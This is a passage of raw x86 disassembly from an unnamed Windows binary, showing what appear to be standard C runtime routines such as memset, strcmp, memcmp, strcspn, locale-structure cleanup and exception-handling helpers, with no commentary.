  427947:	xor    eax,eax
  427949:	jmp    0x427a6f
  42794e:	cmp    eax,DWORD PTR [ebp+0x20]
  427951:	je     0x427a45
  427957:	push   ebx
  427958:	push   ebx
  427959:	lea    ecx,[ebp+0x14]
  42795c:	push   ecx
  42795d:	push   DWORD PTR [ebp+0x10]
  427960:	push   eax
  427961:	push   DWORD PTR [ebp+0x20]
  427964:	call   0x428616
  427969:	add    esp,0x18
  42796c:	mov    DWORD PTR [ebp-0x34],eax
  42796f:	cmp    eax,ebx
  427971:	je     0x427947
  427973:	push   ebx
  427974:	push   ebx
  427975:	push   DWORD PTR [ebp+0x14]
  427978:	push   eax
  427979:	push   DWORD PTR [ebp+0xc]
  42797c:	push   DWORD PTR [ebp+0x8]
  42797f:	call   DWORD PTR ds:0x4290ec
  427985:	mov    esi,eax
  427987:	mov    DWORD PTR [ebp-0x40],esi
  42798a:	cmp    esi,ebx
  42798c:	je     0x427a34
  427992:	mov    DWORD PTR [ebp-0x4],ebx
  427995:	add    eax,0x3
  427998:	and    eax,0xfffffffc
  42799b:	call   0x4253a0
  4279a0:	mov    DWORD PTR [ebp-0x18],esp
  4279a3:	mov    edi,esp
  4279a5:	mov    DWORD PTR [ebp-0x44],edi
  4279a8:	push   esi
  4279a9:	push   ebx
  4279aa:	push   edi
  4279ab:	call   0x427c50
  4279b0:	add    esp,0xc
  4279b3:	jmp    0x4279c5
  4279b5:	xor    eax,eax
  4279b7:	inc    eax
  4279b8:	ret    
  4279b9:	mov    esp,DWORD PTR [ebp-0x18]
  4279bc:	call   0x4287e5
  4279c1:	xor    ebx,ebx
  4279c3:	xor    edi,edi
  4279c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4279c9:	cmp    edi,ebx
  4279cb:	jne    0x4279f0
  4279cd:	push   DWORD PTR [ebp-0x40]
  4279d0:	call   0x426072
  4279d5:	pop    ecx
  4279d6:	mov    edi,eax
  4279d8:	cmp    edi,ebx
  4279da:	je     0x427a0d
  4279dc:	push   DWORD PTR [ebp-0x40]
  4279df:	push   ebx
  4279e0:	push   edi
  4279e1:	call   0x427c50
  4279e6:	add    esp,0xc
  4279e9:	mov    DWORD PTR [ebp-0x38],0x1
  4279f0:	push   DWORD PTR [ebp-0x40]
  4279f3:	push   edi
  4279f4:	push   DWORD PTR [ebp+0x14]
  4279f7:	push   DWORD PTR [ebp-0x34]
  4279fa:	push   DWORD PTR [ebp+0xc]
  4279fd:	push   DWORD PTR [ebp+0x8]
  427a00:	call   DWORD PTR ds:0x4290ec
  427a06:	mov    DWORD PTR [ebp-0x40],eax
  427a09:	cmp    eax,ebx
  427a0b:	jne    0x427a11
  427a0d:	xor    esi,esi
  427a0f:	jmp    0x427a37
  427a11:	push   DWORD PTR [ebp+0x1c]
  427a14:	push   DWORD PTR [ebp+0x18]
  427a17:	lea    eax,[ebp-0x40]
  427a1a:	push   eax
  427a1b:	push   edi
  427a1c:	push   DWORD PTR [ebp+0x20]
  427a1f:	push   DWORD PTR [ebp-0x3c]
  427a22:	call   0x428616
  427a27:	add    esp,0x18
  427a2a:	mov    esi,eax
  427a2c:	neg    esi
  427a2e:	sbb    esi,esi
  427a30:	neg    esi
  427a32:	jmp    0x427a37
  427a34:	mov    esi,DWORD PTR [ebp-0x48]
  427a37:	cmp    DWORD PTR [ebp-0x38],ebx
  427a3a:	je     0x427a5f
  427a3c:	push   edi
  427a3d:	call   0x425f5a
  427a42:	pop    ecx
  427a43:	jmp    0x427a5f
  427a45:	push   DWORD PTR [ebp+0x1c]
  427a48:	push   DWORD PTR [ebp+0x18]
  427a4b:	push   DWORD PTR [ebp+0x14]
  427a4e:	push   DWORD PTR [ebp+0x10]
  427a51:	push   DWORD PTR [ebp+0xc]
  427a54:	push   DWORD PTR [ebp+0x8]
  427a57:	call   DWORD PTR ds:0x4290ec
  427a5d:	mov    esi,eax
  427a5f:	cmp    DWORD PTR [ebp-0x34],ebx
  427a62:	je     0x427a6d
  427a64:	push   DWORD PTR [ebp-0x34]
  427a67:	call   0x425f5a
  427a6c:	pop    ecx
  427a6d:	mov    eax,esi
  427a6f:	lea    esp,[ebp-0x54]
  427a72:	call   0x42538b
  427a77:	ret    
  427a78:	push   0x1c
  427a7a:	push   0x429e88
  427a7f:	call   0x425350
  427a84:	xor    esi,esi
  427a86:	cmp    DWORD PTR ds:0x45ddc0,esi
  427a8c:	jne    0x427ac3
  427a8e:	lea    eax,[ebp-0x1c]
  427a91:	push   eax
  427a92:	xor    edi,edi
  427a94:	inc    edi
  427a95:	push   edi
  427a96:	push   0x429e5c
  427a9b:	push   edi
  427a9c:	call   DWORD PTR ds:0x4290fc
  427aa2:	test   eax,eax
  427aa4:	je     0x427aae
  427aa6:	mov    DWORD PTR ds:0x45ddc0,edi
  427aac:	jmp    0x427ac3
  427aae:	call   DWORD PTR ds:0x429028
  427ab4:	cmp    eax,0x78
  427ab7:	jne    0x427ac3
  427ab9:	mov    DWORD PTR ds:0x45ddc0,0x2
  427ac3:	mov    eax,ds:0x45ddc0
  427ac8:	cmp    eax,0x2
  427acb:	je     0x427bbb
  427ad1:	cmp    eax,esi
  427ad3:	je     0x427bbb
  427ad9:	cmp    eax,0x1
  427adc:	jne    0x427be1
  427ae2:	mov    DWORD PTR [ebp-0x20],esi
  427ae5:	mov    DWORD PTR [ebp-0x24],esi
  427ae8:	cmp    DWORD PTR [ebp+0x18],esi
  427aeb:	jne    0x427af5
  427aed:	mov    eax,ds:0x45ddb4
  427af2:	mov    DWORD PTR [ebp+0x18],eax
  427af5:	push   esi
  427af6:	push   esi
  427af7:	push   DWORD PTR [ebp+0x10]
  427afa:	push   DWORD PTR [ebp+0xc]
  427afd:	xor    eax,eax
  427aff:	cmp    DWORD PTR [ebp+0x20],esi
  427b02:	setne  al
  427b05:	lea    eax,[eax*8+0x1]
  427b0c:	push   eax
  427b0d:	push   DWORD PTR [ebp+0x18]
  427b10:	call   DWORD PTR ds:0x4290f0
  427b16:	mov    edi,eax
  427b18:	mov    DWORD PTR [ebp-0x28],edi
  427b1b:	test   edi,edi
  427b1d:	je     0x427be1
  427b23:	and    DWORD PTR [ebp-0x4],0x0
  427b27:	lea    ebx,[edi+edi*1]
  427b2a:	mov    eax,ebx
  427b2c:	add    eax,0x3
  427b2f:	and    eax,0xfffffffc
  427b32:	call   0x4253a0
  427b37:	mov    DWORD PTR [ebp-0x18],esp
  427b3a:	mov    esi,esp
  427b3c:	mov    DWORD PTR [ebp-0x2c],esi
  427b3f:	push   ebx
  427b40:	push   0x0
  427b42:	push   esi
  427b43:	call   0x427c50
  427b48:	add    esp,0xc
  427b4b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b4f:	jmp    0x427b66
  427b51:	xor    eax,eax
  427b53:	inc    eax
  427b54:	ret    
  427b55:	mov    esp,DWORD PTR [ebp-0x18]
  427b58:	call   0x4287e5
  427b5d:	xor    esi,esi
  427b5f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b63:	mov    edi,DWORD PTR [ebp-0x28]
  427b66:	test   esi,esi
  427b68:	jne    0x427b81
  427b6a:	push   edi
  427b6b:	push   0x2
  427b6d:	call   0x426468
  427b72:	pop    ecx
  427b73:	pop    ecx
  427b74:	mov    esi,eax
  427b76:	test   esi,esi
  427b78:	je     0x427be1
  427b7a:	mov    DWORD PTR [ebp-0x24],0x1
  427b81:	push   edi
  427b82:	push   esi
  427b83:	push   DWORD PTR [ebp+0x10]
  427b86:	push   DWORD PTR [ebp+0xc]
  427b89:	push   0x1
  427b8b:	push   DWORD PTR [ebp+0x18]
  427b8e:	call   DWORD PTR ds:0x4290f0
  427b94:	test   eax,eax
  427b96:	je     0x427ba9
  427b98:	push   DWORD PTR [ebp+0x14]
  427b9b:	push   eax
  427b9c:	push   esi
  427b9d:	push   DWORD PTR [ebp+0x8]
  427ba0:	call   DWORD PTR ds:0x4290fc
  427ba6:	mov    DWORD PTR [ebp-0x20],eax
  427ba9:	cmp    DWORD PTR [ebp-0x24],0x0
  427bad:	je     0x427bb6
  427baf:	push   esi
  427bb0:	call   0x425f5a
  427bb5:	pop    ecx
  427bb6:	mov    eax,DWORD PTR [ebp-0x20]
  427bb9:	jmp    0x427c29
  427bbb:	mov    ebx,DWORD PTR [ebp+0x1c]
  427bbe:	cmp    ebx,esi
  427bc0:	jne    0x427bc8
  427bc2:	mov    ebx,DWORD PTR ds:0x45dda4
  427bc8:	mov    edi,DWORD PTR [ebp+0x18]
  427bcb:	test   edi,edi
  427bcd:	jne    0x427bd5
  427bcf:	mov    edi,DWORD PTR ds:0x45ddb4
  427bd5:	push   ebx
  427bd6:	call   0x4285cd
  427bdb:	pop    ecx
  427bdc:	cmp    eax,0xffffffff
  427bdf:	jne    0x427be5
  427be1:	xor    eax,eax
  427be3:	jmp    0x427c29
  427be5:	cmp    eax,edi
  427be7:	je     0x427c07
  427be9:	push   0x0
  427beb:	push   0x0
  427bed:	lea    ecx,[ebp+0x10]
  427bf0:	push   ecx
  427bf1:	push   DWORD PTR [ebp+0xc]
  427bf4:	push   eax
  427bf5:	push   edi
  427bf6:	call   0x428616
  427bfb:	add    esp,0x18
  427bfe:	mov    esi,eax
  427c00:	test   esi,esi
  427c02:	je     0x427be1
  427c04:	mov    DWORD PTR [ebp+0xc],esi
  427c07:	push   DWORD PTR [ebp+0x14]
  427c0a:	push   DWORD PTR [ebp+0x10]
  427c0d:	push   DWORD PTR [ebp+0xc]
  427c10:	push   DWORD PTR [ebp+0x8]
  427c13:	push   ebx
  427c14:	call   DWORD PTR ds:0x4290f8
  427c1a:	mov    edi,eax
  427c1c:	test   esi,esi
  427c1e:	je     0x427c27
  427c20:	push   esi
  427c21:	call   0x425f5a
  427c26:	pop    ecx
  427c27:	mov    eax,edi
  427c29:	lea    esp,[ebp-0x38]
  427c2c:	call   0x42538b
  427c31:	ret    
  427c32:	mov    eax,ds:0x45ddc4
  427c37:	test   eax,eax
  427c39:	je     0x427c4a
  427c3b:	push   DWORD PTR [esp+0x4]
  427c3f:	call   eax
  427c41:	test   eax,eax
  427c43:	pop    ecx
  427c44:	je     0x427c4a
  427c46:	xor    eax,eax
  427c48:	inc    eax
  427c49:	ret    
  427c4a:	xor    eax,eax
  427c4c:	ret    
  427c4d:	int3   
  427c4e:	int3   
  427c4f:	int3   
  427c50:	mov    edx,DWORD PTR [esp+0xc]
  427c54:	mov    ecx,DWORD PTR [esp+0x4]
  427c58:	test   edx,edx
  427c5a:	je     0x427cab
  427c5c:	xor    eax,eax
  427c5e:	mov    al,BYTE PTR [esp+0x8]
  427c62:	push   edi
  427c63:	mov    edi,ecx
  427c65:	cmp    edx,0x4
  427c68:	jb     0x427c9b
  427c6a:	neg    ecx
  427c6c:	and    ecx,0x3
  427c6f:	je     0x427c7d
  427c71:	sub    edx,ecx
  427c73:	mov    BYTE PTR [edi],al
  427c75:	add    edi,0x1
  427c78:	sub    ecx,0x1
  427c7b:	jne    0x427c73
  427c7d:	mov    ecx,eax
  427c7f:	shl    eax,0x8
  427c82:	add    eax,ecx
  427c84:	mov    ecx,eax
  427c86:	shl    eax,0x10
  427c89:	add    eax,ecx
  427c8b:	mov    ecx,edx
  427c8d:	and    edx,0x3
  427c90:	shr    ecx,0x2
  427c93:	je     0x427c9b
  427c95:	rep stos DWORD PTR es:[edi],eax
  427c97:	test   edx,edx
  427c99:	je     0x427ca5
  427c9b:	mov    BYTE PTR [edi],al
  427c9d:	add    edi,0x1
  427ca0:	sub    edx,0x1
  427ca3:	jne    0x427c9b
  427ca5:	mov    eax,DWORD PTR [esp+0x8]
  427ca9:	pop    edi
  427caa:	ret    
  427cab:	mov    eax,DWORD PTR [esp+0x4]
  427caf:	ret    
  427cb0:	push   esi
  427cb1:	mov    esi,DWORD PTR [esp+0x8]
  427cb5:	test   esi,esi
  427cb7:	je     0x427e3e
  427cbd:	push   DWORD PTR [esi+0x4]
  427cc0:	call   0x425f5a
  427cc5:	push   DWORD PTR [esi+0x8]
  427cc8:	call   0x425f5a
  427ccd:	push   DWORD PTR [esi+0xc]
  427cd0:	call   0x425f5a
  427cd5:	push   DWORD PTR [esi+0x10]
  427cd8:	call   0x425f5a
  427cdd:	push   DWORD PTR [esi+0x14]
  427ce0:	call   0x425f5a
  427ce5:	push   DWORD PTR [esi+0x18]
  427ce8:	call   0x425f5a
  427ced:	push   DWORD PTR [esi]
  427cef:	call   0x425f5a
  427cf4:	push   DWORD PTR [esi+0x20]
  427cf7:	call   0x425f5a
  427cfc:	push   DWORD PTR [esi+0x24]
  427cff:	call   0x425f5a
  427d04:	push   DWORD PTR [esi+0x28]
  427d07:	call   0x425f5a
  427d0c:	push   DWORD PTR [esi+0x2c]
  427d0f:	call   0x425f5a
  427d14:	push   DWORD PTR [esi+0x30]
  427d17:	call   0x425f5a
  427d1c:	push   DWORD PTR [esi+0x34]
  427d1f:	call   0x425f5a
  427d24:	push   DWORD PTR [esi+0x1c]
  427d27:	call   0x425f5a
  427d2c:	push   DWORD PTR [esi+0x38]
  427d2f:	call   0x425f5a
  427d34:	push   DWORD PTR [esi+0x3c]
  427d37:	call   0x425f5a
  427d3c:	add    esp,0x40
  427d3f:	push   DWORD PTR [esi+0x40]
  427d42:	call   0x425f5a
  427d47:	push   DWORD PTR [esi+0x44]
  427d4a:	call   0x425f5a
  427d4f:	push   DWORD PTR [esi+0x48]
  427d52:	call   0x425f5a
  427d57:	push   DWORD PTR [esi+0x4c]
  427d5a:	call   0x425f5a
  427d5f:	push   DWORD PTR [esi+0x50]
  427d62:	call   0x425f5a
  427d67:	push   DWORD PTR [esi+0x54]
  427d6a:	call   0x425f5a
  427d6f:	push   DWORD PTR [esi+0x58]
  427d72:	call   0x425f5a
  427d77:	push   DWORD PTR [esi+0x5c]
  427d7a:	call   0x425f5a
  427d7f:	push   DWORD PTR [esi+0x60]
  427d82:	call   0x425f5a
  427d87:	push   DWORD PTR [esi+0x64]
  427d8a:	call   0x425f5a
  427d8f:	push   DWORD PTR [esi+0x68]
  427d92:	call   0x425f5a
  427d97:	push   DWORD PTR [esi+0x6c]
  427d9a:	call   0x425f5a
  427d9f:	push   DWORD PTR [esi+0x70]
  427da2:	call   0x425f5a
  427da7:	push   DWORD PTR [esi+0x74]
  427daa:	call   0x425f5a
  427daf:	push   DWORD PTR [esi+0x78]
  427db2:	call   0x425f5a
  427db7:	push   DWORD PTR [esi+0x7c]
  427dba:	call   0x425f5a
  427dbf:	add    esp,0x40
  427dc2:	push   DWORD PTR [esi+0x80]
  427dc8:	call   0x425f5a
  427dcd:	push   DWORD PTR [esi+0x84]
  427dd3:	call   0x425f5a
  427dd8:	push   DWORD PTR [esi+0x88]
  427dde:	call   0x425f5a
  427de3:	push   DWORD PTR [esi+0x8c]
  427de9:	call   0x425f5a
  427dee:	push   DWORD PTR [esi+0x90]
  427df4:	call   0x425f5a
  427df9:	push   DWORD PTR [esi+0x94]
  427dff:	call   0x425f5a
  427e04:	push   DWORD PTR [esi+0x98]
  427e0a:	call   0x425f5a
  427e0f:	push   DWORD PTR [esi+0x9c]
  427e15:	call   0x425f5a
  427e1a:	push   DWORD PTR [esi+0xa0]
  427e20:	call   0x425f5a
  427e25:	push   DWORD PTR [esi+0xa4]
  427e2b:	call   0x425f5a
  427e30:	push   DWORD PTR [esi+0xa8]
  427e36:	call   0x425f5a
  427e3b:	add    esp,0x2c
  427e3e:	pop    esi
  427e3f:	ret    
  427e40:	push   esi
  427e41:	mov    esi,DWORD PTR [esp+0x8]
  427e45:	test   esi,esi
  427e47:	je     0x427e9d
  427e49:	mov    eax,DWORD PTR [esi]
  427e4b:	mov    ecx,DWORD PTR ds:0x45d934
  427e51:	cmp    eax,DWORD PTR [ecx]
  427e53:	je     0x427e64
  427e55:	cmp    eax,DWORD PTR ds:0x45d904
  427e5b:	je     0x427e64
  427e5d:	push   eax
  427e5e:	call   0x425f5a
  427e63:	pop    ecx
  427e64:	mov    eax,DWORD PTR [esi+0x4]
  427e67:	mov    ecx,DWORD PTR ds:0x45d934
  427e6d:	cmp    eax,DWORD PTR [ecx+0x4]
  427e70:	je     0x427e81
  427e72:	cmp    eax,DWORD PTR ds:0x45d908
  427e78:	je     0x427e81
  427e7a:	push   eax
  427e7b:	call   0x425f5a
  427e80:	pop    ecx
  427e81:	mov    esi,DWORD PTR [esi+0x8]
  427e84:	mov    eax,ds:0x45d934
  427e89:	cmp    esi,DWORD PTR [eax+0x8]
  427e8c:	je     0x427e9d
  427e8e:	cmp    esi,DWORD PTR ds:0x45d90c
  427e94:	je     0x427e9d
  427e96:	push   esi
  427e97:	call   0x425f5a
  427e9c:	pop    ecx
  427e9d:	pop    esi
  427e9e:	ret    
  427e9f:	push   esi
  427ea0:	mov    esi,DWORD PTR [esp+0x8]
  427ea4:	test   esi,esi
  427ea6:	je     0x427f76
  427eac:	mov    eax,DWORD PTR [esi+0xc]
  427eaf:	mov    ecx,DWORD PTR ds:0x45d934
  427eb5:	cmp    eax,DWORD PTR [ecx+0xc]
  427eb8:	je     0x427ec9
  427eba:	cmp    eax,DWORD PTR ds:0x45d910
  427ec0:	je     0x427ec9
  427ec2:	push   eax
  427ec3:	call   0x425f5a
  427ec8:	pop    ecx
  427ec9:	mov    eax,DWORD PTR [esi+0x10]
  427ecc:	mov    ecx,DWORD PTR ds:0x45d934
  427ed2:	cmp    eax,DWORD PTR [ecx+0x10]
  427ed5:	je     0x427ee6
  427ed7:	cmp    eax,DWORD PTR ds:0x45d914
  427edd:	je     0x427ee6
  427edf:	push   eax
  427ee0:	call   0x425f5a
  427ee5:	pop    ecx
  427ee6:	mov    eax,DWORD PTR [esi+0x14]
  427ee9:	mov    ecx,DWORD PTR ds:0x45d934
  427eef:	cmp    eax,DWORD PTR [ecx+0x14]
  427ef2:	je     0x427f03
  427ef4:	cmp    eax,DWORD PTR ds:0x45d918
  427efa:	je     0x427f03
  427efc:	push   eax
  427efd:	call   0x425f5a
  427f02:	pop    ecx
  427f03:	mov    eax,DWORD PTR [esi+0x18]
  427f06:	mov    ecx,DWORD PTR ds:0x45d934
  427f0c:	cmp    eax,DWORD PTR [ecx+0x18]
  427f0f:	je     0x427f20
  427f11:	cmp    eax,DWORD PTR ds:0x45d91c
  427f17:	je     0x427f20
  427f19:	push   eax
  427f1a:	call   0x425f5a
  427f1f:	pop    ecx
  427f20:	mov    eax,DWORD PTR [esi+0x1c]
  427f23:	mov    ecx,DWORD PTR ds:0x45d934
  427f29:	cmp    eax,DWORD PTR [ecx+0x1c]
  427f2c:	je     0x427f3d
  427f2e:	cmp    eax,DWORD PTR ds:0x45d920
  427f34:	je     0x427f3d
  427f36:	push   eax
  427f37:	call   0x425f5a
  427f3c:	pop    ecx
  427f3d:	mov    eax,DWORD PTR [esi+0x20]
  427f40:	mov    ecx,DWORD PTR ds:0x45d934
  427f46:	cmp    eax,DWORD PTR [ecx+0x20]
  427f49:	je     0x427f5a
  427f4b:	cmp    eax,DWORD PTR ds:0x45d924
  427f51:	je     0x427f5a
  427f53:	push   eax
  427f54:	call   0x425f5a
  427f59:	pop    ecx
  427f5a:	mov    esi,DWORD PTR [esi+0x24]
  427f5d:	mov    eax,ds:0x45d934
  427f62:	cmp    esi,DWORD PTR [eax+0x24]
  427f65:	je     0x427f76
  427f67:	cmp    esi,DWORD PTR ds:0x45d928
  427f6d:	je     0x427f76
  427f6f:	push   esi
  427f70:	call   0x425f5a
  427f75:	pop    ecx
  427f76:	pop    esi
  427f77:	ret    
  427f78:	int3   
  427f79:	int3   
  427f7a:	int3   
  427f7b:	int3   
  427f7c:	int3   
  427f7d:	int3   
  427f7e:	int3   
  427f7f:	int3   
  427f80:	push   ebp
  427f81:	mov    ebp,esp
  427f83:	push   esi
  427f84:	xor    eax,eax
  427f86:	push   eax
  427f87:	push   eax
  427f88:	push   eax
  427f89:	push   eax
  427f8a:	push   eax
  427f8b:	push   eax
  427f8c:	push   eax
  427f8d:	push   eax
  427f8e:	mov    edx,DWORD PTR [ebp+0xc]
  427f91:	lea    ecx,[ecx+0x0]
  427f94:	mov    al,BYTE PTR [edx]
  427f96:	or     al,al
  427f98:	je     0x427fa3
  427f9a:	add    edx,0x1
  427f9d:	bts    DWORD PTR [esp],eax
  427fa1:	jmp    0x427f94
  427fa3:	mov    esi,DWORD PTR [ebp+0x8]
  427fa6:	or     ecx,0xffffffff
  427fa9:	lea    ecx,[ecx+0x0]
  427fac:	add    ecx,0x1
  427faf:	mov    al,BYTE PTR [esi]
  427fb1:	or     al,al
  427fb3:	je     0x427fbe
  427fb5:	add    esi,0x1
  427fb8:	bt     DWORD PTR [esp],eax
  427fbc:	jae    0x427fac
  427fbe:	mov    eax,ecx
  427fc0:	add    esp,0x20
  427fc3:	pop    esi
  427fc4:	leave  
  427fc5:	ret    
  427fc6:	int3   
  427fc7:	int3   
  427fc8:	int3   
  427fc9:	int3   
  427fca:	int3   
  427fcb:	int3   
  427fcc:	int3   
  427fcd:	int3   
  427fce:	int3   
  427fcf:	int3   
  427fd0:	mov    edx,DWORD PTR [esp+0x4]
  427fd4:	mov    ecx,DWORD PTR [esp+0x8]
  427fd8:	test   edx,0x3
  427fde:	jne    0x42801c
  427fe0:	mov    eax,DWORD PTR [edx]
  427fe2:	cmp    al,BYTE PTR [ecx]
  427fe4:	jne    0x428014
  427fe6:	or     al,al
  427fe8:	je     0x428010
  427fea:	cmp    ah,BYTE PTR [ecx+0x1]
  427fed:	jne    0x428014
  427fef:	or     ah,ah
  427ff1:	je     0x428010
  427ff3:	shr    eax,0x10
  427ff6:	cmp    al,BYTE PTR [ecx+0x2]
  427ff9:	jne    0x428014
  427ffb:	or     al,al
  427ffd:	je     0x428010
  427fff:	cmp    ah,BYTE PTR [ecx+0x3]
  428002:	jne    0x428014
  428004:	add    ecx,0x4
  428007:	add    edx,0x4
  42800a:	or     ah,ah
  42800c:	jne    0x427fe0
  42800e:	mov    edi,edi
  428010:	xor    eax,eax
  428012:	ret    
  428013:	nop
  428014:	sbb    eax,eax
  428016:	shl    eax,1
  428018:	add    eax,0x1
  42801b:	ret    
  42801c:	test   edx,0x1
  428022:	je     0x42803c
  428024:	mov    al,BYTE PTR [edx]
  428026:	add    edx,0x1
  428029:	cmp    al,BYTE PTR [ecx]
  42802b:	jne    0x428014
  42802d:	add    ecx,0x1
  428030:	or     al,al
  428032:	je     0x428010
  428034:	test   edx,0x2
  42803a:	je     0x427fe0
  42803c:	mov    ax,WORD PTR [edx]
  42803f:	add    edx,0x2
  428042:	cmp    al,BYTE PTR [ecx]
  428044:	jne    0x428014
  428046:	or     al,al
  428048:	je     0x428010
  42804a:	cmp    ah,BYTE PTR [ecx+0x1]
  42804d:	jne    0x428014
  42804f:	or     ah,ah
  428051:	je     0x428010
  428053:	add    ecx,0x2
  428056:	jmp    0x427fe0
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	mov    eax,DWORD PTR [esp+0xc]
  428064:	test   eax,eax
  428066:	je     0x4280b2
  428068:	mov    edx,DWORD PTR [esp+0x4]
  42806c:	push   esi
  42806d:	push   edi
  42806e:	mov    esi,edx
  428070:	mov    edi,DWORD PTR [esp+0x10]
  428074:	or     edx,edi
  428076:	and    edx,0x3
  428079:	je     0x4280b3
  42807b:	test   eax,0x1
  428080:	je     0x428093
  428082:	mov    cl,BYTE PTR [esi]
  428084:	cmp    cl,BYTE PTR [edi]
  428086:	jne    0x4280e0
  428088:	add    esi,0x1
  42808b:	add    edi,0x1
  42808e:	sub    eax,0x1
  428091:	je     0x4280b0
  428093:	mov    cl,BYTE PTR [esi]
  428095:	mov    dl,BYTE PTR [edi]
  428097:	cmp    cl,dl
  428099:	jne    0x4280e0
  42809b:	mov    cl,BYTE PTR [esi+0x1]
  42809e:	mov    dl,BYTE PTR [edi+0x1]
  4280a1:	cmp    cl,dl
  4280a3:	jne    0x4280e0
  4280a5:	add    edi,0x2
  4280a8:	add    esi,0x2
  4280ab:	sub    eax,0x2
  4280ae:	jne    0x428093
  4280b0:	pop    edi
  4280b1:	pop    esi
  4280b2:	ret    
  4280b3:	mov    ecx,eax
  4280b5:	and    eax,0x3
  4280b8:	shr    ecx,0x2
  4280bb:	je     0x4280e8
  4280bd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280bf:	je     0x4280e8
  4280c1:	mov    ecx,DWORD PTR [esi-0x4]
  4280c4:	mov    edx,DWORD PTR [edi-0x4]
  4280c7:	cmp    cl,dl
  4280c9:	jne    0x4280db
  4280cb:	cmp    ch,dh
  4280cd:	jne    0x4280db
  4280cf:	shr    ecx,0x10
  4280d2:	shr    edx,0x10
  4280d5:	cmp    cl,dl
  4280d7:	jne    0x4280db
  4280d9:	cmp    ch,dh
  4280db:	mov    eax,0x0
  4280e0:	sbb    eax,eax
  4280e2:	pop    edi
  4280e3:	sbb    eax,0xffffffff
  4280e6:	pop    esi
  4280e7:	ret    
  4280e8:	test   eax,eax
  4280ea:	je     0x4280b0
  4280ec:	mov    edx,DWORD PTR [esi]
  4280ee:	mov    ecx,DWORD PTR [edi]
  4280f0:	cmp    dl,cl
  4280f2:	jne    0x4280db
  4280f4:	sub    eax,0x1
  4280f7:	je     0x428115
  4280f9:	cmp    dh,ch
  4280fb:	jne    0x4280db
  4280fd:	sub    eax,0x1
  428100:	je     0x428115
  428102:	and    ecx,0xff0000
  428108:	and    edx,0xff0000
  42810e:	cmp    edx,ecx
  428110:	jne    0x4280db
  428112:	sub    eax,0x1
  428115:	pop    edi
  428116:	pop    esi
  428117:	ret    
  428118:	int3   
  428119:	int3   
  42811a:	int3   
  42811b:	int3   
  42811c:	int3   
  42811d:	int3   
  42811e:	int3   
  42811f:	int3   
  428120:	push   ebp
  428121:	mov    ebp,esp
  428123:	push   edi
  428124:	push   esi
  428125:	push   ebx
  428126:	mov    ecx,DWORD PTR [ebp+0x10]
  428129:	jecxz  0x428152
  42812b:	mov    ebx,ecx
  42812d:	mov    edi,DWORD PTR [ebp+0x8]
  428130:	mov    esi,edi
  428132:	xor    eax,eax
  428134:	repnz scas al,BYTE PTR es:[edi]
  428136:	neg    ecx
  428138:	add    ecx,ebx
  42813a:	mov    edi,esi
  42813c:	mov    esi,DWORD PTR [ebp+0xc]
  42813f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428141:	mov    al,BYTE PTR [esi-0x1]
  428144:	xor    ecx,ecx
  428146:	cmp    al,BYTE PTR [edi-0x1]
  428149:	ja     0x428150
  42814b:	je     0x428152
  42814d:	sub    ecx,0x2
  428150:	not    ecx
  428152:	mov    eax,ecx
  428154:	pop    ebx
  428155:	pop    esi
  428156:	pop    edi
  428157:	leave  
  428158:	ret    
  428159:	int3   
  42815a:	int3   
  42815b:	int3   
  42815c:	int3   
  42815d:	int3   
  42815e:	int3   
  42815f:	int3   
  428160:	push   ebp
  428161:	mov    ebp,esp
  428163:	push   esi
  428164:	xor    eax,eax
  428166:	push   eax
  428167:	push   eax
  428168:	push   eax
  428169:	push   eax
  42816a:	push   eax
  42816b:	push   eax
  42816c:	push   eax
  42816d:	push   eax
  42816e:	mov    edx,DWORD PTR [ebp+0xc]
  428171:	lea    ecx,[ecx+0x0]
  428174:	mov    al,BYTE PTR [edx]
  428176:	or     al,al
  428178:	je     0x428183
  42817a:	add    edx,0x1
  42817d:	bts    DWORD PTR [esp],eax
  428181:	jmp    0x428174
  428183:	mov    esi,DWORD PTR [ebp+0x8]
  428186:	mov    edi,edi
  428188:	mov    al,BYTE PTR [esi]
  42818a:	or     al,al
  42818c:	je     0x42819a
  42818e:	add    esi,0x1
  428191:	bt     DWORD PTR [esp],eax
  428195:	jae    0x428188
  428197:	lea    eax,[esi-0x1]
  42819a:	add    esp,0x20
  42819d:	pop    esi
  42819e:	leave  
  42819f:	ret    
  4281a0:	push   ebp
  4281a1:	mov    ebp,esp
  4281a3:	push   ebx
  4281a4:	push   esi
  4281a5:	push   edi
  4281a6:	push   ebp
  4281a7:	push   0x0
  4281a9:	push   0x0
  4281ab:	push   0x4281b8
  4281b0:	push   DWORD PTR [ebp+0x8]
  4281b3:	call   0x428c2e
  4281b8:	pop    ebp
  4281b9:	pop    edi
  4281ba:	pop    esi
  4281bb:	pop    ebx
  4281bc:	mov    esp,ebp
  4281be:	pop    ebp
  4281bf:	ret    
  4281c0:	mov    ecx,DWORD PTR [esp+0x4]
  4281c4:	test   DWORD PTR [ecx+0x4],0x6
  4281cb:	mov    eax,0x1
  4281d0:	je     0x4281e1
  4281d2:	mov    eax,DWORD PTR [esp+0x8]
  4281d6:	mov    edx,DWORD PTR [esp+0x10]
  4281da:	mov    DWORD PTR [edx],eax
  4281dc:	mov    eax,0x3
  4281e1:	ret    
  4281e2:	push   ebx
  4281e3:	push   esi
  4281e4:	push   edi
  4281e5:	mov    eax,DWORD PTR [esp+0x10]
  4281e9:	push   eax
  4281ea:	push   0xfffffffe
  4281ec:	push   0x4281c0
  4281f1:	push   DWORD PTR fs:0x0
  4281f8:	mov    DWORD PTR fs:0x0,esp
  4281ff:	mov    eax,DWORD PTR [esp+0x20]
  428203:	mov    ebx,DWORD PTR [eax+0x8]
  428206:	mov    esi,DWORD PTR [eax+0xc]
  428209:	cmp    esi,0xffffffff
  42820c:	je     0x42823c
  42820e:	cmp    esi,DWORD PTR [esp+0x24]
  428212:	je     0x42823c
  428214:	lea    esi,[esi+esi*2]
  428217:	mov    ecx,DWORD PTR [ebx+esi*4]
  42821a:	mov    DWORD PTR [esp+0x8],ecx
  42821e:	mov    DWORD PTR [eax+0xc],ecx
  428221:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428226:	jne    0x42823a
  428228:	push   0x101
